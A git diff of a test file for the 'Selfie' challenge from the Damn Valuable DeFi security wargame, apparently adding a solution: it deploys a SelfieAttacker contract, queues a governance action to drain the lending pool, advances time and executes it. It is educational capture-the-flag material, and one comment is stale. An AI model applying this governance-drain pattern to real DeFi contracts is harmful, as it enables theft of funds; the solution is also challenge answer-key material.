@@ -1,48 +1,66 @@
-const { ether, time } = require('@openzeppelin/test-helpers');
-const { accounts, contract } = require('@openzeppelin/test-environment');
+const { ether, time } = require("@openzeppelin/test-helpers");
+const { accounts, contract } = require("@openzeppelin/test-environment");
 
-const DamnValuableTokenSnapshot = contract.fromArtifact('DamnValuableTokenSnapshot');
-const SelfiePool = contract.fromArtifact('SelfiePool');
-const SimpleGovernance = contract.fromArtifact('SimpleGovernance');
+const DamnValuableTokenSnapshot = contract.fromArtifact(
+  "DamnValuableTokenSnapshot"
+);
+const SelfiePool = contract.fromArtifact("SelfiePool");
+const SimpleGovernance = contract.fromArtifact("SimpleGovernance");
+const SelfieAttacker = contract.fromArtifact("SelfieAttacker");
 
-const { expect } = require('chai');
+const { expect } = require("chai");
 
-describe('[Challenge] Selfie', function () {
+describe("[Challenge] Selfie", function () {
+  const [deployer, attacker, ...otherAccounts] = accounts;
 
-    const [deployer, attacker, ...otherAccounts] = accounts;
+  const TOKEN_INITIAL_SUPPLY = ether("2000000");
+  const TOKENS_IN_POOL = ether("1500000");
 
-    const TOKEN_INITIAL_SUPPLY = ether('2000000')
-    const TOKENS_IN_POOL = ether('1500000');
-    
+  before(async function () {
+    /** SETUP SCENARIO */
+    this.token = await DamnValuableTokenSnapshot.new(TOKEN_INITIAL_SUPPLY, {
+      from: deployer,
+    });
+    this.governance = await SimpleGovernance.new(this.token.address, {
+      from: deployer,
+    });
+    this.pool = await SelfiePool.new(
+      this.token.address,
+      this.governance.address,
+      { from: deployer }
+    );
 
-    before(async function () {
-        /** SETUP SCENARIO */
-        this.token = await DamnValuableTokenSnapshot.new(TOKEN_INITIAL_SUPPLY, { from: deployer });
-        this.governance = await SimpleGovernance.new(this.token.address, { from: deployer });
-        this.pool = await SelfiePool.new(
-            this.token.address,
-            this.governance.address, 
-            { from: deployer }
-        );
-
-        await this.token.transfer(this.pool.address, TOKENS_IN_POOL, { from: deployer });
-
-        expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.be.bignumber.equal(TOKENS_IN_POOL);
+    await this.token.transfer(this.pool.address, TOKENS_IN_POOL, {
+      from: deployer,
     });
 
-    it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
-    });
+    expect(await this.token.balanceOf(this.pool.address)).to.be.bignumber.equal(
+      TOKENS_IN_POOL
+    );
+  });
 
-    after(async function () {
-        /** SUCCESS CONDITIONS */
-        expect(
-            await this.token.balanceOf(attacker)
-        ).to.be.bignumber.equal(TOKENS_IN_POOL);        
-        expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.be.bignumber.equal('0');
-    });
+  it("Exploit", async function () {
+    // Advance time 5 days so that depositors can get rewards
+
+    this.attacker = await SelfieAttacker.new(
+      this.token.address,
+      this.governance.address,
+      this.pool.address,
+      { from: attacker }
+    );
+    // queues action to drain all funds to attack
+    await this.attacker.attack({ from: attacker });
+    await time.increase(time.duration.days(2));
+    await this.governance.executeAction(await this.attacker.actionId(), { from: attacker });
+  });
+
+  after(async function () {
+    /** SUCCESS CONDITIONS */
+    expect(await this.token.balanceOf(attacker)).to.be.bignumber.equal(
+      TOKENS_IN_POOL
+    );
+    expect(await this.token.balanceOf(this.pool.address)).to.be.bignumber.equal(
+      "0"
+    );
+  });
 });
